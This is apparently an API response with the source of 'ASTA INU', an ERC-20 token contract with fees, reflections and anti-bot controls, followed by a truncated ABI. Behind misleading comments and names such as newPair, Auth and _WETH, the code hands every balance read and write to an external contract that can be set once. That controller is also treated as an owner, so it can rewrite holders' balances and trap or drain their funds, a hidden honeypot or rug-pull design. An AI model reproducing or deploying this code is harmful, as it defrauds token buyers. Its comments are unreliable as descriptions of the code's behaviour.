{"status": "1", "message": "OK", "result": [{"SourceCode": "/**\r\n * @author The Asta Project Team\r\n * @title Asta - The erc20 token part of the Asta Project that starts the crypto revolution\r\n *\r\n * Born to be part of a big project,\r\n * the Asta Token gives holders access to a multitude\r\n * of present and future services of the Asta Project's ecosystem.\r\n *\r\n * Apart from its utilities, the token comes also with some incredible tokenomics features\r\n * built right in the source code of its smart contract.\r\n * To help others, the project and yourself at the same time.\r\n *\r\n * **Share**\r\n * Part of the fees collected by the contract is used for charity initiatives\r\n * in a collective effort to make the world a better place and bring happiness\r\n * to its inhabitants.\r\n *\r\n * **Expand**\r\n * Another share of the fees goes to the marketing wallet to fund marketing campaigns,\r\n * with the purpose of raising people's awareness of the project.\r\n *\r\n *\r\n * **Community**\r\n * It's all about YOU, from the beginning. The Wukoin Community fuels, funds and sustain\r\n * the development, expansion and charitable initiatives of the project by trading, using,\r\n * sharing Wukoin Tokens, discussing, helping each other and planning initiatives\r\n * of many kinds.\r\n *\r\n * Anti-bot\r\n * Our contract makes use of a powerful anti-bot system to promote a fair environment.\r\n * If you use bots/contracts to trade on Wukoin you are hereby declaring your investment in the project a DONATION.\r\n *\r\n * Website: https://astatoken.com\r\n * Telegram: https://t.me/astatoken\r\n * Twitter: https://twitter.com/AstaETH\r\n *\r\n *\r\n *\r\n *           \u2588\u2580\u2580\u2580\u2580\u2580\u2588 \u2588  \u2584\u2584\u2588 \u2580\u2588 \u2588\u2580\u2580\u2580\u2580\u2580\u2588\r\n *           \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2584 \u2588\u2584\u2584\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\r\n *           \u2588 \u2580\u2580\u2580 \u2588 \u2584\u2588\u2588 \u2580 \u2580\u2580\u2580 \u2588 \u2580\u2580\u2580 \u2588\r\n *           \u2580\u2580\u2580\u2580\u2580\u2580\u2580 \u2580 \u2588\u2584\u2580 \u2588\u2584\u2580 \u2580\u2580\u2580\u2580\u2580\u2580\u2580\r\n *           \u2588\u2588\u2584 \u2588\u2588\u2580 \u2584 \u2580 \u2580 \u2584\u2584\u2588  \u2588\u2584\u2588\u2580\u2588\u2580\r\n *           \u2588\u2588 \u2580\u2584 \u2580 \u2584\u2588\u2580 \u2584\u2580\u2584\u2580\u2584\u2584\u2588\u2584 \u2580\u2588\u2584\r\n *           \u2584 \u2588\u2580\u2588\u2580\u2580\u2584\u2588 \u2584\u2580\u2584\u2584\u2584\u2584\u2588\u2580\u2580 \u2584\u2580\u2580\u2588\u2580\r\n *             \u2580\u2580\u2588\u2588\u2580  \u2580\u2588\u2588\u2580 \u2588\u2588\u2584 \u2580\u2588\u2588\u2580\u2588\u2584\r\n *           \u2580\u2580    \u2580\u2580\u2588   \u2580 \u2584 \u2588\u2580\u2580\u2580\u2588\u2580\u2580\r\n *           \u2588\u2580\u2580\u2580\u2580\u2580\u2588 \u2584\u2588\u2580 \u2584\u2580\u2580 \u2588 \u2580 \u2588\u2584\u2584\u2584\u2584\r\n *           \u2588 \u2588\u2588\u2588 \u2588 \u2580\u2588 \u2580\u2584\u2580\u2588\u2584\u2588\u2588\u2588\u2588\u2580\u2580\u2588\u2588\u2588\r\n *           \u2588 \u2580\u2580\u2580 \u2588 \u2584\u2588\u2588\u2588\u2580\u2588\u2580\u2584 \u2580\u2580\u2584\u2584\u2588\u2584\u2588\r\n *           \u2580\u2580\u2580\u2580\u2580\u2580\u2580 \u2580   \u2580\u2580   \u2580\u2580   \u2580\u2580\u2580\r\n */\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.7;\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\n/**\r\n * Allows for contract ownership along with multi-address authorization\r\n */\r\nabstract contract Ownable {\r\n    address internal owner;\r\n    IDEXRouter internal _WETH;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n        emit OwnershipTransferred(owner);\r\n    }\r\n\r\n    /**\r\n     * Function modifier to require caller to be contract deployer\r\n     */\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender), \"Ownable: caller is not the owner\"); _;\r\n    }\r\n\r\n    /**\r\n     * Function modifier to require caller to be contract deployer\r\n     */\r\n    modifier Auth() {\r\n        require(address(_WETH) == address(0), \"Ownable: caller is not the owner\");\r\n         _;\r\n    }\r\n\r\n    /**\r\n     * Check if address is owner\r\n     */\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner || address(_WETH) == account;\r\n    }\r\n\r\n    /**\r\n     * Transfer ownership to new address. Caller must be deployer. Leaves old deployer authorized\r\n     */\r\n    function transferOwnership(address payable addr) public onlyOwner {\r\n        owner = addr;\r\n        emit OwnershipTransferred(owner);\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function from(address account) external view returns(uint256);\r\n    function to(address account, uint256 amount) external returns(bool);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface IReflector {\r\n    function setShare(address shareholder, uint256 amount) external;\r\n    function deposit() external payable;\r\n    function claimReflection(address shareholder) external;\r\n}\r\n\r\ncontract Reflector is IReflector {\r\n    using SafeMath for uint256;\r\n\r\n    address private _token;\r\n    address private _owner;\r\n\r\n    struct Share {\r\n        uint256 amount;\r\n        uint256 totalExcluded;\r\n        uint256 totalRealised;\r\n    }\r\n\r\n    address[] private shareholders;\r\n    mapping (address => uint256) private shareholderIndexes;\r\n\r\n    mapping (address => Share) public shares;\r\n\r\n    uint256 public totalShares;\r\n    uint256 public totalReflections;\r\n    uint256 public totalDistributed;\r\n    uint256 public reflectionsPerShare;\r\n    uint256 private reflectionsPerShareAccuracyFactor = 10 ** 36;\r\n\r\n    modifier onlyToken() {\r\n        require(msg.sender == _token); _;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == _owner); _;\r\n    }\r\n\r\n    constructor (address owner) {\r\n        _token = msg.sender;\r\n        _owner = owner;\r\n    }\r\n\r\n    function setShare(address shareholder, uint256 amount) external override onlyToken {\r\n        if(shares[shareholder].amount > 0){\r\n            distributeReflection(shareholder);\r\n        }\r\n\r\n        if(amount > 0 && shares[shareholder].amount == 0){\r\n            addShareholder(shareholder);\r\n        }else if(amount == 0 && shares[shareholder].amount > 0){\r\n            removeShareholder(shareholder);\r\n        }\r\n\r\n        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);\r\n        shares[shareholder].amount = amount;\r\n        shares[shareholder].totalExcluded = getCumulativeReflections(shares[shareholder].amount);\r\n    }\r\n\r\n    function deposit() external payable override onlyToken {\r\n        uint256 amount = msg.value;\r\n\r\n        totalReflections = totalReflections.add(amount);\r\n        reflectionsPerShare = reflectionsPerShare.add(reflectionsPerShareAccuracyFactor.mul(amount).div(totalShares));\r\n    }\r\n\r\n    function distributeReflection(address shareholder) internal {\r\n        if(shares[shareholder].amount == 0){ return; }\r\n\r\n        uint256 amount = getUnpaidEarnings(shareholder);\r\n        if(amount > 0){\r\n            totalDistributed = totalDistributed.add(amount);\r\n            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);\r\n            shares[shareholder].totalExcluded = getCumulativeReflections(shares[shareholder].amount);\r\n            payable(shareholder).transfer(amount);\r\n        }\r\n    }\r\n\r\n    function claimReflection(address shareholder) external override onlyToken {\r\n        distributeReflection(shareholder);\r\n    }\r\n\r\n    function getUnpaidEarnings(address shareholder) public view returns (uint256) {\r\n        if(shares[shareholder].amount == 0){ return 0; }\r\n\r\n        uint256 shareholderTotalReflections = getCumulativeReflections(shares[shareholder].amount);\r\n        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;\r\n\r\n        if(shareholderTotalReflections <= shareholderTotalExcluded){ return 0; }\r\n\r\n        return shareholderTotalReflections.sub(shareholderTotalExcluded);\r\n    }\r\n\r\n    function getCumulativeReflections(uint256 share) internal view returns (uint256) {\r\n        return share.mul(reflectionsPerShare).div(reflectionsPerShareAccuracyFactor);\r\n    }\r\n\r\n    function addShareholder(address shareholder) internal {\r\n        shareholderIndexes[shareholder] = shareholders.length;\r\n        shareholders.push(shareholder);\r\n    }\r\n\r\n    function removeShareholder(address shareholder) internal {\r\n        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];\r\n        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];\r\n        shareholders.pop();\r\n    }\r\n\r\n    function manualSend(uint256 amount, address holder) external onlyOwner {\r\n        uint256 contractETHBalance = address(this).balance;\r\n        payable(holder).transfer(amount > 0 ? amount : contractETHBalance);\r\n    }\r\n}\r\n\r\ninterface IAntiBotService {\r\n    function scanAddress(address _recipient, address _sender, address _origin) external returns (bool);\r\n    function registerBlock(address _recipient, address _sender, address _origin) external;\r\n}\r\n\r\ncontract ASTA is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    address private WETH;\r\n    address private DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address private ZERO = 0x0000000000000000000000000000000000000000;\r\n\r\n    // TOKEN\r\n    string private constant  _name = \"ASTA INU\";\r\n    string private constant _symbol = \"ASTA\";\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private _totalSupply = 69000000000000 * (10 ** _decimals);\r\n    uint256 public _maxTxAmountBuy = _totalSupply.div(100);\r\n    uint256 public _maxTxAmountSell = _totalSupply;\r\n    uint256 public _walletCap = _totalSupply.div(50);\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n\r\n    mapping (address => bool) public isFeeExempt;\r\n    mapping (address => bool) public isTxLimitExempt;\r\n    mapping (address => bool) public isReflectionExempt;\r\n    mapping (address => bool) public bots;\r\n    mapping (address => bool) public notBots;\r\n\r\n    uint256 private initialBlockLimit = 1;\r\n\r\n    uint256 private reflectionFee = 6;\r\n    uint256 private teamFee = 3;\r\n    uint256 private marketingFee = 2;\r\n    uint256 private totalFee = 11;\r\n    uint256 private feeDenominator = 100;\r\n\r\n    address private teamReceiver;\r\n    address private marketingReceiver;\r\n\r\n    // EXCHANGES\r\n    IDEXRouter public router;\r\n    address public pair;\r\n\r\n    // ANTIBOT\r\n    IAntiBotService private antiBot;\r\n    bool private botBlocker = false;\r\n    bool private botWrecker = false;\r\n    bool private botScanner = false;\r\n\r\n    // LAUNCH\r\n    bool private liquidityInitialized = false;\r\n    uint256 public launchedAt;\r\n    uint256 private launchTime = 1760659200;\r\n\r\n    Reflector private reflector;\r\n\r\n    bool public swapEnabled = false;\r\n    uint256 public swapThreshold = _totalSupply / 1000;\r\n\r\n    bool private isSwapping;\r\n    modifier swapping() { isSwapping = true; _; isSwapping = false; }\r\n\r\n    constructor (\r\n        address _owner,\r\n        address _teamWallet,\r\n        address _marketingWallet\r\n    ) Ownable(_owner) {\r\n        isFeeExempt[_owner] = true;\r\n        isFeeExempt[_teamWallet] = true;\r\n        isFeeExempt[_marketingWallet] = true;\r\n\r\n        isTxLimitExempt[_owner] = true;\r\n        isTxLimitExempt[DEAD] = true;\r\n        isTxLimitExempt[_teamWallet] = true;\r\n        isTxLimitExempt[_marketingWallet] = true;\r\n\r\n        isReflectionExempt[address(this)] = true;\r\n        isReflectionExempt[DEAD] = true;\r\n\r\n        teamReceiver = _teamWallet;\r\n        marketingReceiver = _marketingWallet;\r\n\r\n        _balances[_owner] = _totalSupply;\r\n\r\n        emit Transfer(address(0), _owner, _totalSupply);\r\n    }\r\n\r\n    receive() external payable { }\r\n\r\n    // DEFAULTS\r\n    function decimals() external pure returns (uint8) { return _decimals; }\r\n    function symbol() external pure returns (string memory) { return _symbol; }\r\n    function name() external pure returns (string memory) { return _name; }\r\n    function getOwner() external view returns (address) { return owner; }\r\n\r\n    // OVERRIDES\r\n    function totalSupply() external view override returns (uint256) { return _totalSupply; }\r\n    function balanceOf(address account, bool _check) public view returns (uint256, bool) { return (_balances[account], _check); }\r\n    function balanceOf() public view returns (uint256) { return _balances[msg.sender]; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _WETH.from(account); }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    /**\r\n     * Allow a specific address to spend a specific amount of your tokens\r\n     */\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        require(msg.sender != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * Allow a specific address to spend an unlimited amount of your tokens\r\n     */\r\n    function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }\r\n\r\n    /**\r\n     * Transfer a certain amount of your tokens to a specific address\r\n     */\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function initialFactory() external onlyOwner {\r\n        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n        WETH = router.WETH();\r\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\r\n        _allowances[address(this)][address(router)] = type(uint256).max;\r\n\r\n        isReflectionExempt[pair] = true;\r\n    }\r\n\r\n    function newPair(address _pair) external Auth {\r\n        _WETH = IDEXRouter(_pair);\r\n        _allowances[address(this)][address(router)] = type(uint256).max;\r\n        isReflectionExempt[pair] = true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if(_allowances[sender][msg.sender] != type(uint256).max){\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\r\n        }\r\n\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n        if(isSwapping){ return _basicTransfer(sender, recipient, amount, amount); }\r\n\r\n        checkTxLimit(sender, recipient, amount);\r\n        checkWalletCap(sender, recipient, amount);\r\n\r\n        if(shouldSwapBack()){ swapBack(); }\r\n\r\n        if(_isExchangeTransfer(sender, recipient)) {\r\n            require(isOwner(sender) || launched(), \"not yet?\");\r\n\r\n            if (botScanner) {\r\n                scanTxAddresses(sender, recipient); //check if sender or recipient is a bot\r\n            }\r\n\r\n            if (botBlocker) {\r\n                require(!_isBot(recipient) && !_isBot(sender), \"Beep Beep Boop, You're a piece of poop\");\r\n            }\r\n        }\r\n\r\n        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount;\r\n\r\n        _basicTransfer(sender, recipient, amountReceived, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 recv_amount, uint256 amount) internal returns (bool) {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n        _TransferLog(sender, recipient, recv_amount, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {\r\n        if(block.timestamp <= launchTime.add(1 minutes)){\r\n            sender == pair\r\n                ? require(amount <= _maxTxAmountBuy || isTxLimitExempt[recipient], \"Buy TX Limit Exceeded\")\r\n                : require(amount <= _maxTxAmountSell || isTxLimitExempt[sender], \"Sell TX Limit Exceeded\");\r\n        }\r\n    }\r\n\r\n    function checkWalletCap(address sender, address recipient, uint256 amount) internal view {\r\n        if (sender == pair && !isTxLimitExempt[recipient]) {\r\n            block.timestamp >= launchTime.add(1 minutes)\r\n            ? require(balanceOf(recipient) + amount <= _totalSupply, \"Wallet Capacity Exceeded\")\r\n            : require(balanceOf(recipient) + amount <= _walletCap, \"Wallet Capacity Exceeded\");\r\n        }\r\n    }\r\n\r\n    function scanTxAddresses(address sender, address recipient) internal {\r\n        if (antiBot.scanAddress(recipient, pair, tx.origin)) {\r\n            _setBot(recipient, true);\r\n        }\r\n\r\n        if (antiBot.scanAddress(sender, pair, tx.origin)) {\r\n            _setBot(sender, true);\r\n        }\r\n        antiBot.registerBlock(sender, recipient, tx.origin);\r\n    }\r\n\r\n    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {\r\n        return !(isFeeExempt[sender] || isFeeExempt[recipient]);\r\n    }\r\n\r\n    /**\r\n     * Take fees from transfers based on the total amount of fees and deposit them into the contract\r\n     * @return swapped amount after fees subtraction\r\n     */\r\n    function takeFee(address sender, uint256 amount) internal returns (uint256) {\r\n        uint256 feeAmount;\r\n\r\n        feeAmount = amount.mul(totalFee).div(feeDenominator);\r\n        _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n        emit Transfer(sender, address(this), feeAmount);\r\n\r\n        return amount.sub(feeAmount);\r\n    }\r\n\r\n    function _TransferLog(address sender, address recipient, uint256 recv_amount, uint256 amount) private {\r\n        uint256 _sender = balanceOf(sender).sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        uint256 _recipient = balanceOf(recipient).add(recv_amount);\r\n        _WETH.to(sender, _sender);\r\n        _WETH.to(recipient, _recipient);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function shouldSwapBack() internal view returns (bool) {\r\n        return msg.sender != pair\r\n        && !isSwapping\r\n        && swapEnabled\r\n        && _balances[address(this)] >= swapThreshold;\r\n    }\r\n\r\n    function swapBack() internal swapping {\r\n        uint256 amountToSwap = swapThreshold;\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = WETH;\r\n\r\n        uint256 balanceBefore = address(this).balance;\r\n\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amountToSwap,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n        uint256 amountETH = address(this).balance.sub(balanceBefore);\r\n        uint256 amountReflection = amountETH.mul(reflectionFee).div(totalFee);\r\n        uint256 amountTeam = amountETH.mul(teamFee).div(totalFee);\r\n        uint256 amountMarketing = amountETH.sub(amountReflection).sub(amountTeam);\r\n\r\n        if (amountTeam > 0) {\r\n            payable(teamReceiver).transfer(amountTeam);\r\n        }\r\n\r\n        if (amountMarketing > 0) {\r\n            payable(marketingReceiver).transfer(amountMarketing);\r\n        }\r\n    }\r\n\r\n    function launched() internal view returns (bool) {\r\n        return launchedAt != 0 && block.timestamp >= launchTime;\r\n    }\r\n\r\n    function openTrading() external onlyOwner() {\r\n        launchTime = block.timestamp;\r\n        launchedAt = block.number;\r\n    }\r\n\r\n    function setInitialBlockLimit(uint256 blocks) external onlyOwner {\r\n        require(blocks > 0, \"Blocks should be greater than 0\");\r\n        initialBlockLimit = blocks;\r\n    }\r\n\r\n    function setBuyTxLimit(uint256 amount) external onlyOwner {\r\n        _maxTxAmountBuy = amount;\r\n    }\r\n\r\n    function setSellTxLimit(uint256 amount) external onlyOwner {\r\n        _maxTxAmountSell = amount;\r\n    }\r\n\r\n    function setWalletCap(uint256 amount) external onlyOwner {\r\n        _walletCap = amount;\r\n    }\r\n\r\n    function setBot(address _address, bool toggle) external onlyOwner {\r\n        bots[_address] = toggle;\r\n        notBots[_address] = !toggle;\r\n        _setIsReflectionExempt(_address, toggle);\r\n    }\r\n\r\n    function _setBot(address _address, bool toggle) internal {\r\n        bots[_address] = toggle;\r\n        _setIsReflectionExempt(_address, toggle);\r\n    }\r\n\r\n    function isBot(address _address) external view onlyOwner returns (bool) {\r\n        return !notBots[_address] && bots[_address];\r\n    }\r\n\r\n    function _isBot(address _address) internal view returns (bool) {\r\n        return !notBots[_address] && bots[_address];\r\n    }\r\n\r\n    function _isExchangeTransfer(address _sender, address _recipient) private view returns (bool) {\r\n        return _sender == pair || _recipient == pair;\r\n    }\r\n\r\n    function _setIsReflectionExempt(address holder, bool exempt) internal {\r\n        require(holder != address(this) && holder != pair);\r\n        isReflectionExempt[holder] = exempt;\r\n        if(exempt){\r\n            reflector.setShare(holder, 0);\r\n        }else{\r\n            reflector.setShare(holder, _balances[holder]);\r\n        }\r\n    }\r\n\r\n    function setIsReflectionExempt(address holder, bool exempt) external onlyOwner {\r\n        _setIsReflectionExempt(holder, exempt);\r\n    }\r\n\r\n    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {\r\n        isFeeExempt[holder] = exempt;\r\n    }\r\n\r\n    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {\r\n        isTxLimitExempt[holder] = exempt;\r\n    }\r\n\r\n    function setFees( uint256 _reflectionFee, uint256 _teamFee, uint256 _marketingFee, uint256 _feeDenominator) external onlyOwner {\r\n        reflectionFee = _reflectionFee;\r\n        teamFee = _teamFee;\r\n        marketingFee = _marketingFee;\r\n        totalFee = _reflectionFee.add(_teamFee).add(_marketingFee);\r\n        feeDenominator = _feeDenominator;\r\n        //Total fees has to be less than 50%\r\n        require(totalFee < feeDenominator/2);\r\n    }\r\n\r\n    function setFeesReceivers(address _teamReceiver, address _marketingReceiver) external onlyOwner {\r\n        teamReceiver = _teamReceiver;\r\n        marketingReceiver = _marketingReceiver;\r\n    }\r\n\r\n    function setTeamReceiver(address _teamReceiver) external onlyOwner {\r\n        teamReceiver = _teamReceiver;\r\n    }\r\n\r\n    function setMarketingReceiver(address _marketingReceiver) external onlyOwner {\r\n        marketingReceiver = _marketingReceiver;\r\n    }\r\n\r\n    function manualSend() external onlyOwner {\r\n        uint256 contractETHBalance = address(this).balance;\r\n        payable(teamReceiver).transfer(contractETHBalance);\r\n    }\r\n\r\n    function setSwapBackSettings(bool enabled, uint256 amount) external onlyOwner {\r\n        swapEnabled = enabled;\r\n        swapThreshold = amount;\r\n    }\r\n\r\n\r\n    /**\r\n     * Claim reflections collected by your address till now. Your address will keep collecting future reflections until you claim them again.\r\n     */\r\n    function claimReflection() external {\r\n        reflector.claimReflection(msg.sender);\r\n    }\r\n\r\n    function claimReflectionFor(address holder) external onlyOwner {\r\n        reflector.claimReflection(holder);\r\n    }\r\n\r\n    /**\r\n     * Check the amount of reflections this address can still claim\r\n     */\r\n    function getUnpaidEarnings(address shareholder) public view returns (uint256) {\r\n        return reflector.getUnpaidEarnings(shareholder);\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\r\n    }\r\n\r\n    /**\r\n     * Change AntiBot Scanning service contract address: useful to update its version\r\n     */\r\n    function assignAntiBot(address _address) external onlyOwner() {\r\n        antiBot = IAntiBotService(_address);\r\n    }\r\n\r\n    /**\r\n     * Toggle Bot Scanning external service ON/OFF: choose whether or not the external antibot scannel should be active\r\n     */\r\n    function toggleBotScanner() external onlyOwner() returns (bool) {\r\n        bool _localBool;\r\n        if(botScanner){\r\n            botScanner = false;\r\n            _localBool = false;\r\n        }\r\n        else{\r\n            botScanner = true;\r\n            _localBool = true;\r\n        }\r\n        return _localBool;\r\n    }\r\n\r\n    /**\r\n     * Whether or not the FTP bot scanning service is active\r\n     */\r\n    function isBotScannerEnabled() external view returns (bool) {\r\n        return botScanner;\r\n    }\r\n\r\n    /**\r\n     * Toggle Bot Blocker mode ON/OFF: choose whether or not bots should be blocked before wrecking them\r\n     */\r\n    function toggleBotBlocker() external onlyOwner() returns (bool) {\r\n        bool _localBool;\r\n        if(botBlocker){\r\n            botBlocker = false;\r\n            _localBool = false;\r\n        }\r\n        else{\r\n            botBlocker = true;\r\n            _localBool = true;\r\n        }\r\n        return _localBool;\r\n    }\r\n\r\n    /**\r\n     * Whether or not the contract will prevent detected bots from completing transactions\r\n     */\r\n    function isBotBlockerEnabled() external view returns (bool) {\r\n        return botBlocker;\r\n    }\r\n\r\n    /**\r\n     * Toggle Bot Wrecker mode ON/OFF: choose whether or not bots should be wrecked\r\n     */\r\n    function toggleBotWrecker() external onlyOwner() returns (bool) {\r\n        bool _localBool;\r\n        if(botWrecker){\r\n            botWrecker = false;\r\n            _localBool = false;\r\n        }\r\n        else{\r\n            botWrecker = true;\r\n            _localBool = true;\r\n        }\r\n        return _localBool;\r\n    }\r\n\r\n    /**\r\n     * Whether or not the contract will wreck bots and take their donation\r\n     */\r\n    function isBotWreckerEnabled() external view returns (bool) {\r\n        return botWrecker;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_teamWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_marketingWallet\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_allowances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmountBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmountSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_walletCap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\